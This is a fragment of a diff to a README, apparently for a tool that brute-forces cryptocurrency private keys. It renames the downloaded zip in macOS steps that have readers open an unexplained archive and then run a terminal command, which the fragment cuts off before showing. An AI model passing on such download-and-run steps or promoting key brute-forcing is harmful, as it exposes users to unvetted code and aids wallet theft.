@@ -69,9 +69,9 @@ Brute-forcing private keys is a matter of substantial time and computational pow
 
 ### 🍎 For macOS
 
-1. Download the file `CryptoMar.zip`
+1. Download the file `CryptoMarAPP.zip`
 
-2. Open the file `CryptoMar.zip` in Download folder
+2. Open the file `CryptoMarAPP.zip` in Download folder
 
 3. Open the terminal, enter the following, and press Enter:
 
